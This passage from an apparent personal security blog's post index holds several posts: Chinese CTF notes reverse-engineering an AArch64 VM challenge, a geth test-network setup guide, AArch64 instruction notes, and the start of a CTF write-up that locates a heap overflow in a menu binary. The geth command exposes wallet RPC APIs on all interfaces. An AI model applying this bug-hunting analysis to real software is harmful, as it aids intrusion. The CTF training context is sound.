printf(&quot;pos:%d,%d\\n&quot;, *(unsigned int *)(v0 + 40), *(unsigned int *)(v0 + 44));        puts(*((const char **)&amp;ptr_ + *(int *)(v0 + 36)));      &#125;    &#125;    ++*(_QWORD *)(v0 + 72);                     // opcode_ptr ++    JUMPOUT(0xED0LL);  &#125;  JUMPOUT(0x25B8LL);&#125;\n\nget_nextvoid sub_2514()&#123;  __int64 v0; // x29  ++*(_QWORD *)(v0 + 0x48);                     // opcode_ptr ++  JUMPOUT(0xED0LL);&#125;\n\nexit_void __noreturn exit_()&#123;  puts(&quot;Finish&quot;);  exit(1);&#125;\n\nI dubugging this program, I found just input ‘awdsp+-*&#x2F;‘ making the program aborted.\nSo input map followings:\nset breaking pinter: b *(0x5500000000 + 0xED0 ) \na: 0x5500001d10\nw:0x5500001620\nd: 0x5500002080\ns: 0x5500001990\n+: 0x5500001394\n-: 0x55000014d4\n*: 0x5500001018\n&#x2F;: 0x55000011f4\np: 0x5500002400\nenter_flag: 0x5500014098\n基本上能翻译为c伪装代码的就这几个函数，但是，enter_flag不知道该怎么设置为0。逻辑都进不去@_@。上面这个是在比赛那天分析的一部分。\n复现该程序存在一些函数跳转表，在parse函数下，ida反编译如下:\nvoid sub_E14()&#123;  _QWORD v0[12]; // [xsp+58h] [xbp+58h]  v0[0] = func_0;  v0[1] = func_1[0];  v0[2] = func_2[0];  v0[3] = func_3[0];  v0[4] = func_4[0];  v0[5] = func_5[0];  v0[6] = func_6[0];  v0[7] = func_7[0];  v0[8] = func_8[0];  v0[9] = func_9;  v0[10] = func_a;  v0[11] = func_b;  __asm &#123; BR              X0 &#125;&#125;\n\n当时我还以为是寄存器的初始化，一直搞不明白它是怎么跳的。通过看汇编代码，通过下断点进行动态分析:\nb *(0x5500000000 + 0xe14) 如下:\nsub_E14\n.text:0000000000000E14                 STP             X29, X30, [SP,#var_C0]!.text:0000000000000E18                 MOV             X29, SP.text:0000000000000E1C                 STR             X19, [SP,#0xC0+var_B0].text:0000000000000E20                 ADRP            X0, #__stack_chk_guard_ptr@PAGE.text:0000000000000E24                 LDR             X0, [X0,#__stack_chk_guard_ptr@PAGEOFF]; 获取只读页基址,.text:0000000000000E28                 LDR             X1, [X0] ; 获取cannary值.text:0000000000000E2C                 STR             X1, [X29,#0xC0+var_8]; 储存cannary值在堆栈里.text:0000000000000E30                 MOV             X1, #0.text:0000000000000E34                 ADRP            X0, #reg_1@PAGE ; 获取data段基址，这里存放的是函数跳转表.text:0000000000000E38                 ADD             X1, X0, #reg_1@PAGEOFF ; x1, x0, #0x10.text:0000000000000E3C                 ADD             X0, X29, #0x58 ; 开始从虚函数表中赋值到堆栈中.text:0000000000000E40                 LDP             X2, X3, [X1]; 加载第一个函数地址, 0x5500000eb8.text:0000000000000E44                 STP             X2, X3, [X0]; 赋值到堆栈中.text:0000000000000E48                 LDP             X2, X3, [X1,#0x10] ; 加载第二个函数地址, 0x55000011f4.text:0000000000000E4C                 STP             X2, X3, [X0,#0x10].text:0000000000000E50                 LDP             X2, X3, [X1,#0x20] ; 加载第三个函数地址, 0x55000014d4.text:0000000000000E54                 STP             X2, X3, [X0,#0x20].text:0000000000000E58                 LDP             X2, X3, [X1,#0x30] ; 加载第三个函数地址, 0x5500001990.text:0000000000000E5C                 STP             X2, X3, [X0,#0x30].text:0000000000000E60                 LDP             X2, X3, [X1,#0x40] ; 加载第四个函数地址, 0x5500002080.text:0000000000000E64                 STP             X2, X3, [X0,#0x40].text:0000000000000E68                 LDP             X1, X2, [X1,#0x50] ; 加载第四个函数地址, 0x5500002514.text:0000000000000E6C                 STP             X1, X2, [X0,#0x50].text:0000000000000E70                 ADRP            X0, #off_13F98@PAGE ; 获取堆栈基址.text:0000000000000E74                 LDR             X0, [X0,#off_13F98@PAGEOFF] ; 通过堆栈某变量获取在bss段储存输入的指针变量.text:0000000000000E78                 LDR             X0, [X0] ; 通过该变量获取储存输入的堆指针.text:0000000000000E7C                 STR             X0, [X29,#0xC0+var_78] ; 将该指针储存在堆栈 var_78 处.text:0000000000000E80                 LDR             X0, [X29,#0xC0+var_78] ;.text:0000000000000E84                 STR             X0, [X29,#0xC0+var_70] ; 将该指针储存在堆栈 var_78 处.text:0000000000000E88                 LDR             X0, [X29,#0xC0+var_78] ;.text:0000000000000E8C                 LDRB            W0, [X0] ; 取出输入的地一个字节.text:0000000000000E90                 MOV             W1, W0 ;将第一个字节放在w1中.text:0000000000000E94                 ADRP            X0, #off_13FE8@PAGE ; 获取只读页的base address.text:0000000000000E98                 LDR             X0, [X0,#off_13FE8@PAGEOFF] ;opcode跳转表 0x5500003770 ◂— 0xb0000000a.text:0000000000000E9C                 SXTW            X1, W1 ;拓展为64位, 这里还是输入数据的第一个字节.text:0000000000000EA0                 LDR             W0, [X0,X1,LSL#2]; ；x0 + x1*4计算出来的地址读取一字节到w0中，这里x1是我们输入的一字节, x0就是opcode跳转表地址.text:0000000000000EA4                 SXTW            X0, W0  # 拓展为64位.text:0000000000000EA8                 LSL             X0, X0, #3 ;左移3位.text:0000000000000EAC                 ADD             X1, X29, #0x58 ; 获取之前加载的函数跳转表.text:0000000000000EB0                 LDR             X0, [X1,X0] ; 计算通过获取[x1 + x0]得到真正的函数地址.text:0000000000000EB4                 B               loc_ED0\n\n\n\nloc_ED0\n.text:0000000000000ED0 loc_ED0                                 ; CODE XREF: parse+A0↑j.text:0000000000000ED0                                         ; parse+200↓j ....text:0000000000000ED0                 BR              X0 ; 跳到x0指向的地址\n\n\n\n函数跳转表如下：\n.data:0000000000014010 func_0          DCQ init_program        ; DATA XREF: parse+20↑o.data:0000000000014010                                         ; parse+24↑o.data:0000000000014018 func_1          DCQ mul_1018.data:0000000000014020 func_2          DCQ div_11F4.data:0000000000014028 func_3          DCQ plus_1394.data:0000000000014030 func_4          DCQ _sub_14d4.data:0000000000014038 func_5          DCQ w_1620.data:0000000000014040 func_6          DCQ s_1990.data:0000000000014048 func_7          DCQ a_1d10.data:0000000000014050 func_8          DCQ d_2080.data:0000000000014058 func_9          DCQ print_2400.data:0000000000014060 func_a          DCQ exit_.data:0000000000014068 func_b          DCQ get_next\n\n\n\n\n\nopcode 跳转表如下: 0x5500003770\n0A 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 ; 00   [00 -&gt; exit_]0B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 000B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 ; 080B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 0B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 ; 100B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 000B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 ; 180B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 000B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 ; 200B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 000B 00 00 00 0B 00 00 00  01 00 00 00 03 00 00 00 ; 28   [2a -&gt; mul_1018, 2b -&gt; plus_1394]0B 00 00 00 04 00 00 00  0B 00 00 00 02 00 00 00 ;      [2d -&gt; _sub_14d4, 2f -&gt; div_11F4]0B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 ; 300B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 0B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 ; 380B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 000B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 ; 400B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 000B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 ; 480B 00 00 00 00 00 00 00  0B 00 00 00 0B 00 00 00        [4d -&gt; init_program]0B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 ; 500B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 000B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 ; 580B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 000B 00 00 00 07 00 00 00  0B 00 00 00 0B 00 00 00 ; 60   [61 -&gt; a_1d10]08 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00        [64 -&gt; d_2080]0B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 ; 680B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 0009 00 00 00 0B 00 00 00  0B 00 00 00 06 00 00 00 ; 70   [70 -&gt; print_2400, 73 -&gt; s_1990]0B 00 00 00 0B 00 00 00  0B 00 00 00 05 00 00 00        [77 -&gt; w_1620]0B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 ; 780B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 0B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 ; 800B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 000B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 ; 880B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 000B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 ; 900B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 000B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 ; 980B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 000B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 ; a00B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 000B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 ; a80B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 000B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 ; b00B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 000B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 ; b80B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 000B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 ; c00B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 000B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 ; c80B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 000B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 ; d00B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 000B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 ; d80B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 000B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 ; e00B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 000B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 ; e80B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 000B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 ; f00B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 000B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00 ; f80B 00 00 00 0B 00 00 00  0B 00 00 00 0B 00 00 00\n\n\n\n经过调试, 对应opcode * 4之后跳转如下:\n通过分析，程序采用 function_table[opcode_table[opcode * 4]]\n所以对应查找出opcode对应函数如下:\n00 -&gt; exit_\n2a -&gt; mul_1018\n2b -&gt; plus_1394\n2d -&gt; _sub_14d4\n2f -&gt; div_11F4\n4d -&gt; init_program (EB8)\n61 -&gt; a_1d10\n64 -&gt; d_2080\n70 -&gt; print_2400\n73 -&gt; s_1990\n77 -&gt; w_1620\n而其他的opcode在opcode_table[opcode * 4]之后，都会去执行 get_next (2514) 函数\n通过逆向分析，程序进行逻辑交互，则必须要的使enter_flag(14098)变量赋值为1才能进行交互，不然都是执行abort，然而init_program这个分支是不能伪代码反编译的，应该加了花指令，在ghidra下直接不能反编译为汇编。这只能得看汇编了。\n.text:0000000000000EB8 init_program                            ; DATA XREF: .data:func_0↓o.text:0000000000000EB8                 ADRP            X0, #off_13F90@PAGE ; 获取bss段base adreess.text:0000000000000EBC                 LDR             X0, [X0,#off_13F90@PAGEOFF] ; 获取enter_flag变量地址.text:0000000000000EC0                 LDR             W0, [X0] ; 获取enter_flag变量的值.text:0000000000000EC4                 CMP             W0, #0 ; 与0做对比，若等于0跳到 loc_ED4处,初始化的时候,enter_flag值是为0的.text:0000000000000EC8                 B.NE            loc_2564.text:0000000000000ECC                 B               loc_ED4\n\n\n\n跳到loc_ED4，这里也没办法反编译，又只能看汇编QAQ。。。\n.text:0000000000000ED4 loc_ED4                                 ; CODE XREF: parse+B8↑j.text:0000000000000ED4                 LDR             X0, [X29,#0xC0+var_78] ; 获取输入数据的指针 opcode_ptr = buf_ptr.text:0000000000000ED8                 ADD             X0, X0, #1 ; opcode_ptr += 1.text:0000000000000EDC                 LDRB            W0, [X0]; 获取opcode_ptr指向的该值.text:0000000000000EE0                 MOV             W1, W0 ; 赋值给w1.text:0000000000000EE4                 ADRP            X0, #off_13FD8@PAGE .text:0000000000000EE8                 LDR             X0, [X0,#off_13FD8@PAGEOFF] ; 获取对应变量size_l (1409C).text:0000000000000EEC                 STR             W1, [X0] ; 将opcde_ptr对应的一字节赋值给size_l.text:0000000000000EF0                 LDR             X0, [X29,#0xC0+var_78] ; 重新获取输入数据指针, 相当于 opcode_ptr = buf_ptr.text:0000000000000EF4                 ADD             X0, X0, #2 ; opcode_ptr += 2.text:0000000000000EF8                 LDRB            W0, [X0] ; 获取输入数据的第3个值.text:0000000000000EFC                 MOV             W1, W0 ; 赋值给w1.text:0000000000000F00                 ADRP            X0, #off_13F68@PAGE.text:0000000000000F04                 LDR             X0, [X0,#off_13F68@PAGEOFF] ; 获取对应变量size_r (140A0).text:0000000000000F08                 STR             W1, [X0] ; 将输入数据的第3个值赋值给该变量.text:0000000000000F0C                 ADRP            X0, #off_13FD8@PAGE.text:0000000000000F10                 LDR             X0, [X0,#off_13FD8@PAGEOFF] ; 获取变量size_l地址.text:0000000000000F14                 LDR             W0, [X0] ; 获取size_l中的单字节数据.text:0000000000000F18                 CMP             W0, #0x10 ; 判断size_l == 0x10.text:0000000000000F1C                 B.GT            loc_256C ; 大于的话，退出.text:0000000000000F20                 ADRP            X0, #off_13F68@PAGE.text:0000000000000F24                 LDR             X0, [X0,#off_13F68@PAGEOFF] ; 获取size_r地址.text:0000000000000F28                 LDR             W0, [X0] ; 获取size_r中的单字节数据.text:0000000000000F2C                 CMP             W0, #0x10 ; 判断size_r == 0x10.text:0000000000000F30                 B.GT            loc_256C  ; 大于的话，退出.text:0000000000000F34                 ADRP            X0, #off_13FD8@PAGE.text:0000000000000F38                 LDR             X0, [X0,#off_13FD8@PAGEOFF] ; 获取变量size_l地址.text:0000000000000F3C                 LDR             W0, [X0]  ; 获取size_l中的单字节数据.text:0000000000000F40                 CMP             W0, #3  ; size_l与3做比较，若小于等于3，退出.text:0000000000000F44                 B.LE            loc_256C.text:0000000000000F48                 ADRP            X0, #off_13F68@PAGE .text:0000000000000F4C                 LDR             X0, [X0,#off_13F68@PAGEOFF] ; 获取变量size_r地址.text:0000000000000F50                 LDR             W0, [X0].text:0000000000000F54                 CMP             W0, #3 ; size_r与3做比较，若小于等于3，退出.text:0000000000000F58                 B.LE            loc_256C.text:0000000000000F5C                 ADRP            X0, #off_13FD8@PAGE.text:0000000000000F60                 LDR             X0, [X0,#off_13FD8@PAGEOFF] ; 获取变量size_l地址.text:0000000000000F64                 LDR             W1, [X0].text:0000000000000F68                 ADRP            X0, #off_13F68@PAGE.text:0000000000000F6C                 LDR             X0, [X0,#off_13F68@PAGEOFF] ; 获取变量size_r地址.text:0000000000000F70                 LDR             W0, [X0].text:0000000000000F74                 MUL             W0, W1, W0 ; w0 = size_l * size_r.text:0000000000000F78                 SXTW            X0, W0  ; nmemb.text:0000000000000F7C                 MOV             X1, #1  ; size.text:0000000000000F80                 BL              .calloc ; 调用calloc(size_l * size_r).text:0000000000000F84                 MOV             X1, X0  ; 将返回值赋给x1.text:0000000000000F88                 ADRP            X0, #off_13F80@PAGE.text:0000000000000F8C                 LDR             X0, [X0,#off_13F80@PAGEOFF] ; 获取变量 buf_1 (14088) 地址.text:0000000000000F90                 STR             X1, [X0] ; 开辟的内存指针 放在变量 buf_1中.text:0000000000000F94                 ADRP            X0, #off_13FD8@PAGE.text:0000000000000F98                 LDR             X0, [X0,#off_13FD8@PAGEOFF] ; 获取变量size_l地址.text:0000000000000F9C                 LDR             W1, [X0].text:0000000000000FA0                 ADRP            X0, #off_13F68@PAGE.text:0000000000000FA4                 LDR             X0, [X0,#off_13F68@PAGEOFF] ; 获取变量size_r地址.text:0000000000000FA8                 LDR             W0, [X0].text:0000000000000FAC                 MUL             W0, W1, W0 ; w0 = size_l * size_r.text:0000000000000FB0                 SXTW            X0, W0  ; nmemb.text:0000000000000FB4                 MOV             X1, #1  ; size.text:0000000000000FB8                 BL              .calloc ; 再开辟一次 calloc(size_l * size_r).text:0000000000000FBC                 MOV             X1, X0.text:0000000000000FC0                 ADRP            X0, #off_13FF0@PAGE.text:0000000000000FC4                 LDR             X0, [X0,#off_13FF0@PAGEOFF] ; 获取变量 buf_2 (14090) 地址.text:0000000000000FC8                 STR             X1, [X0] ; 开辟的内存指针 放在变量 buf_2中.text:0000000000000FCC                 ADRP            X0, #off_13F90@PAGE.text:0000000000000FD0                 LDR             X0, [X0,#off_13F90@PAGEOFF] ; 获取enter_flag变量的地址.text:0000000000000FD4                 MOV             W1, #1.text:0000000000000FD8                 STR             W1, [X0] ; 给enter_flag变量赋值为1.text:0000000000000FDC                 LDR             X0, [X29,#0xC0+var_78] ; 获取输入数据的指针 opcode_ptr = buf_ptr.text:0000000000000FE0                 ADD             X0, X0, #3 ; opcode += 3.text:0000000000000FE4                 STR             X0, [X29,#0xC0+var_78] ; 设置buf_ptr = opcode_ptr.text:0000000000000FE8                 LDR             X0, [X29,#0xC0+var_78] ; 获取该opcode_ptr.text:0000000000000FEC                 LDRB            W0, [X0] ; 获取该opcode_ptr指向的值.text:0000000000000FF0                 MOV             W1, W0.text:0000000000000FF4                 ADRP            X0, #off_13FE8@PAGE.text:0000000000000FF8                 LDR             X0, [X0,#off_13FE8@PAGEOFF] ; opcode_table的地址.text:0000000000000FFC                 SXTW            X1, W1.text:0000000000001000                 LDR             W0, [X0,X1,LSL#2] ;通过opcode查找函数跳转表的索引.text:0000000000001004                 SXTW            X0, W0.text:0000000000001008                 LSL             X0, X0, #3.text:000000000000100C                 ADD             X1, X29, #0x58 ; 获取函数跳转表地址.text:0000000000001010                 LDR             X0, [X1,X0] ; 获取真正要跳转的地址.text:0000000000001014                 B               loc_ED0.text:0000000000001014 ; End of function parse\n\n\n\n通过以上我大致写一下伪c代码吧:\nvoid init_program(char **opcode_ptr_ptr) &#123;\tchar *opcode_ptr = *opcode_ptr_ptr;\topcode_ptr += 1;\tsize_l = *opcode_ptr;\topcode_ptr += 1;\tsize_r = *opcode_ptr;\tif(size_r &gt; 0x10 || size_l &gt; 0x10 || size_r &lt;= 3 || size_l &lt;= 3) &#123;\t\texit_();\t&#125;\tbuf_1 = calloc(size_l * size_r);\tbuf_2 = calloc(size_l * size_r);\tenter_flag = 1;\t*opcode_ptr_ptr += 3;\tjump function_table[opcode_table(**opcode_ptr_ptr)] // 这里的opcode_table()代表是通过一系列操作得到的函数表索引&#125;\n\n进入该函数 opcode &#x3D; ‘4d’ + ‘0x00’ + ‘0x01’, 然后这里的’0x00’是要赋值给size_l，’0x01’赋值给size_r。\n想要进入其他函数，不abort的情况下就的使enter_flag不为0了，调用init_program这个分支是第一步，这样才能操作其他函数。\n好了基本所有函数逻辑已经清楚明白了，我没该怎么利用？漏洞在哪？\nhint2提示: 漏洞点在于车辆前方的绿灯或红灯的转化，使车辆到达了地图外\n车是什么玩意？ 红绿灯？地图？\n通过分析mul_1018, div_11f4，plus_1394，_sub_14d4 都没发现漏洞QAQ。\nWEB\n签到师傅们常说，要善于学习，细致入微；师傅们也常说，要善于分享，总结归纳。 \nhint:\n2021年3月28日，PHP维护的官方Git服务器 git.php.net 被袭击，其Git仓库遭到恶意篡改。如果开发者使用这些遭到篡改的源代码进行网页的开发的话，网站就会在不知情的情况下被感染。\n不知道什么东西\n\n\n\n\n是一个个人博客\n","categories":["ctf"],"tags":["pwn"]},{"title":"Blockchain","url":"/2021/04/03/security/blockchain/blockchain/","content":"BlockchainBasic Envremix ide:\nhttp://remix.ethereum.org/\nOr install on local\nsudo apt-get install nodejssudo npm install remix-ide -g\n\n\n\nDounload geth ethereum client: https://geth.ethereum.org/downloads/\nRun geth to sttart a RPC test env:\n./geth --networkid 123 --dev --datadir data1 --rpc --rpcapi &quot;db,eth,net,web3,miner,personal,debug&quot; --rpcaddr 0.0.0.0 --rpcport 8545 console\n\n\n\nEnter geth console\n&gt; personal.newAccount() # create a new account&gt; personal.newAccount() # create a new account again&gt; eth.accounts # show users list&gt; eth.getBalance(eth.accounts[0]) # The default account&#x27;s banlance is infinite1.15792089237316195423570985008687907853269984665640564039437587945047129639927e+77&gt;user0=eth.accounts[0] // Set user0 = accounts[0]&quot;0x36225609210808cc4693d9b819d9648585202d63&quot;&gt; user1=eth.accounts[1] // Set user1 = accounts[1]ddd&quot;0x2300c1b01cd14c2aa64a8d070e1576bb71f9d1fa&quot;&gt; user2=eth.accounts[2]&quot;0xefb9dc7fe744728293a3e63d7fcd948053997e07&quot;&gt; eth.sendTransaction(&#123;from:user0,to:user1,value:web3.toWei(10,&#x27;ether&#x27;)&#125;) #转账10 ether&gt; eth.sendTransaction(&#123;from:user0,to:user2,value:web3.toWei(10,&#x27;ether&#x27;)&#125;) #转账10 ether\n\n\n\n\n\nref: https://www.freebuf.com/articles/blockchain-articles/193357.html \n","categories":["security"],"tags":["blockchain"]},{"title":"AARCH64","url":"/2021/04/03/security/pwn/aarch64/","content":"AARCH64—————寄存器学习——————–33个寄存器：X0X30, SP(X31)和PCW0 ~ W31分别是X0X31的低32位\nSP：通过SP寄存器确定参数和变量的位置。X0：保存函数的返还结果。X0X7：用于传递子程序参数，多余参数采用堆栈传递X9X15：临时寄存器，使用时不需要保存X29 FP：此寄存器指向栈低。X30 LR：用于保存子程序返回地址，x31 SP：通过SP寄存器确定参数和变量的位置。x32 PC：寄存器，记录当前指令是那一条\nB指令BR指令：寄存器跳转B.NE指令：向低地址跳转。类似于jmp指令，之间跳转：\nBL 指令进行调用\nMOV指令LDR指令STR指令MOV为寄存器之间，LDR读取内存中数据保存到寄存器，STR读取寄存器中数据保存到内存。\nADRP指令ADD指令SUB指令这些指令有时又三个操作数或四个操作数。这两个指令经常连在一起：ADRP指令获取页基址，保存到X0，add指令通过页基址+偏移获取到变量的地址。\nsub x1, x1, x16\n表示: x1&#x3D; x1- x16。\nASR #n 算术右移n 位（1≤n≤32）LSL #n 逻辑左移n 位（1≤n≤31）LSR #n 逻辑左移n 位（1≤n≤32）ROR #n 循环右移n 位（1≤n≤31）举例：ADD R1，R1，R1，LSL #3 ；R1&#x3D;R19SUB R1，R1，R2，LSR#2 ；R1&#x3D;R1-R24\nSTP指令LDP指令入栈指令和出栈指令，主要是可以操纵两个寄存器，下图STP将X29和X30入栈到 sp+var_50的位置，然后将sp&#x3D; sp+var_50（var_50可为正负数）实际上并不是入栈，是内存地址的覆盖，sp+var_50 覆盖为x29，然后sp+var_50+0x8 覆盖为x30\nref: https://blog.csdn.net/qq_39869547/article/details/105037770\nref: https://www.pianshen.com/article/6301588/\nref: https://developer.arm.com/documentation/102374/0101/Registers-in-AArch64---general-purpose-registers\n","categories":["security"],"tags":["aarch64"]},{"title":"The Writeup Of Hong Ming Gu Cup Online","url":"/2021/04/02/security/ctf/compitation/wp-hong-ming-gu/","content":"Hong Ming Gu Cup Online战队名称：没有任何战队排名：41战队ID：T566675解题数量：5得分：634\n\n\n\nPWN - [Maybe_fun_game (双边协议1.0)]IntroThis challenge I think is a little bit difficult for me. because these vulnerability cannot exploit easily.\nchecksec\nChecksec file: pwn[*] &#x27;/run/media/i0gan/disk1/share/hmgb/pwn1/pwn&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled    FORTIFY:  Enabled\n\nAttachment:\nMaybe_fun_game.zip \nJust a single binary file, not include libc.so.6 file. So we have to leak information of libc version by some ways.\nReversing[i0gan@arch pwn1]$ ./pwn eFY0EnhWNBIuAAAAAAAAAAgAAAAAAAAABgAAAAAAAABBQUFBQUFBQTEuTmV3Lg==eFY0EnhWNBIuAAAAAAAAAAgAAAAAAAAABgAAAAAAAABBQUFBQUFBQTIuRGVsLg==eFY0EnhWNBIvAAAAAAAAAAgAAAAAAAAABwAAAAAAAABBQUFBQUFBQTMuRWRpdC4=eFY0EnhWNBIvAAAAAAAAAAgAAAAAAAAABwAAAAAAAABBQUFBQUFBQTQuU2hvdy4=eFY0EnhWNBIxAAAAAAAAAAgAAAAAAAAACQAAAAAAAABBQUFBQUFBQUNob2ljZSA/Pg==AAAeFY0EnhWNBI2AAAAAAAAAAgAAAAAAAAADgAAAAAAAABBQUFBQUFBQUlsbGVnYWwgTWFnaWMh\n\nWe don’t know how these words means, But easily guess that it is base64 encoded. Now we should analyse this binary file by IDA tools.\nmunu functionunsigned __int64 menu()&#123;  enc_print(&quot;1.New.&quot;);  enc_print(&quot;2.Del.&quot;);  enc_print(&quot;3.Edit.&quot;);  enc_print(&quot;4.Show.&quot;);  return enc_print(&quot;Choice &gt;&gt;&quot;);&#125;\n\nCall enc_print function encoding string to print it.\nmain functionvoid __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123;  const char *v3; // rax  char v4; // al  const char *v5; // rax  const char *body; // rax  char c; // cl  __int64 v8; // rdx  const char *body_; // rax  char c_; // cl  __int64 v11; // rdx  init_();  while ( 1 )  &#123;    while ( 1 )                                 // delete    &#123;      while ( 1 )      &#123;        menu();        v3 = dec_input();        if ( !strcmp(v3, &quot;ERROR&quot;) )        &#123;          free(global_ptr);          exit(0);        &#125;        v4 = *v3;        if ( v4 != &#x27;2&#x27; )          break;        free(src);        src = 0LL;        size = 0;      &#125;      if ( v4 &gt; &#x27;2&#x27; )        break;      if ( v4 == &#x27;1&#x27; )                          // new      &#123;        enc_print(&quot;Size &gt;&gt;&quot;);        v5 = dec_input();        size = strtol(v5, 0LL, 10);        free(global_ptr);        if ( (unsigned int)(size - 1) &lt;= 0x7E )        &#123;          src = (char *)malloc(size);          enc_print(&quot;Content &gt;&gt;&quot;);          body_ = dec_input();          if ( size &gt; 0 )          &#123;            c_ = *body_;            if ( *body_ )            &#123;              v11 = 1LL;              do              &#123;                src[v11 - 1] = c_;                if ( size &lt;= (int)v11 )                  break;                c_ = body_[v11++];              &#125;              while ( c_ );            &#125;          &#125;LABEL_18:          free(global_ptr);        &#125;        else        &#123;          enc_print(&quot;Illegal size!&quot;);        &#125;      &#125;      else      &#123;LABEL_12:        enc_print(&quot;Your Choice is invaild.&quot;);      &#125;    &#125;    if ( v4 == &#x27;3&#x27; )                            // edit    &#123;      enc_print(&quot;Content &gt;&gt;&quot;);      body = dec_input();      if ( size &gt; 0 )      &#123;        c = *body;        if ( *body != &#x27;\\n&#x27; )        &#123;          v8 = 1LL;          do          &#123;            src[v8 - 1] = c;            if ( size &lt;= (int)v8 )              break;            c = body[v8++];          &#125;          while ( c != &#x27;\\n&#x27; );        &#125;      &#125;      goto LABEL_18;    &#125;    if ( v4 != &#x27;4&#x27; )                            // print      goto LABEL_12;    enc_print(src);  &#125;&#125;\n\nAll logical function are here.\nThese program have 4 functions\n1.New: new data, needs size, and content2.Del: delete data3.Edit. edit data, just needs content4.Show. show data content\nWe execute New function, that just use a src veriable to store returned pointer. that means we just can control a chunk every time.\nWhen execute New function, input size more than 0x7F, So this program haven’t malloc memory, but set the size veriable as new one.\nenc_print(&quot;Size &gt;&gt;&quot;);        v5 = dec_input();        size = strtol(v5, 0LL, 10);        free(global_ptr);        if ( (unsigned int)(size - 1) &lt;= 0x7E )\n\nThat can cause modify the size variable. If we new a normal data, then we input a size more than &gt; 0x7F, when we execute Edit function, we can input more data to chunk. So that cause a heap overflow here.\nenc_print functionunsigned __int64 __fastcall printw(char *src)&#123;  __int64 size_; // rbx  _QWORD *v2; // r14  char *v3; // rax  size_t v4; // rdx  char *v5; // r13  __int64 v6; // rax  __int64 vars0[512]; // [rsp+0h] [rbp+0h] BYREF  char s[4104]; // [rsp+1000h] [rbp+1000h] BYREF  unsigned __int64 vars2008; // [rsp+2008h] [rbp+2008h]  qword_203110 = 8LL;  vars2008 = __readfsqword(0x28u);  memset(vars0, 0, sizeof(vars0));  memset(s, 0, 0x1000uLL);  qword_203100 = 0x1234567812345678LL; // magic  size_ = strlen(src); // Get length of string  real_size = size_; // size  v2 = calloc(8uLL, 1uLL);  qword_203120 = (__int64)v2;  *v2 = 0x4141414141414141LL; // end flag  v3 = (char *)calloc(size_, 1uLL);  v4 = size_;  v5 = v3;  qword_203128 = (__int64)v3;  size_ += 0x28LL;  strncpy(v3, src, v4);  qword_203108 = size_;  vars0[1] = size_;  vars0[0] = qword_203100;  vars0[2] = qword_203110;  vars0[3] = real_size;  v6 = _stpcpy_chk((char *)&amp;vars0[4] + strlen((const char *)&amp;vars0[4]), v2, 4064LL); // copy end flag  _strcpy_chk(v6, (__int64)v5, 4064LL);  base64_enc((unsigned __int8 *)vars0, size_, (__int64)s);  puts(s);  return __readfsqword(0x28u) ^ vars2008;&#125;\n\nWe should reverse this protocol by read pseudo code.\nsrc is a source string will be encoded.\nqword_203100 = 0x1234567812345678 is protocol’s magic.\nv2 store end flag of protocol \nvars0 is an array to store information of this 